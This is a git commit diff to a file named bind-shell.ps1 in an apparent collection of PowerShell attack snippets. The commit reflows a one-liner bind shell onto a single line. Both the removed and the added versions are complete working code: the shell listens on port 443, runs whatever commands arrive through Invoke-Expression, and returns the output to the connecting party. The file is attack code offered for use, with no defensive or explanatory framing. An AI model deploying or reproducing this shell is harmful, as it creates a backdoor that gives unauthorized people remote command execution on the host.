0dc4daa461248a298058cb0d8572d20baf69a111
ChrononX <45243151+ChrononX@users.noreply.github.com>
2021-10-30 03:01:30 +0400

    Update bind-shell.ps1

--- Powershell_Codes/bind-shell.ps1
+++ Powershell_Codes/bind-shell.ps1
@@ -1,9 +1,3 @@
 #One liner bind-shell
 
-powershell -c "$listener = New-Object System.Net.Sockets.TcpListener(
-'0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie
-nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt
-es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString
-($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS '+ (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str
-eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto
-p()"
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS '+ (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
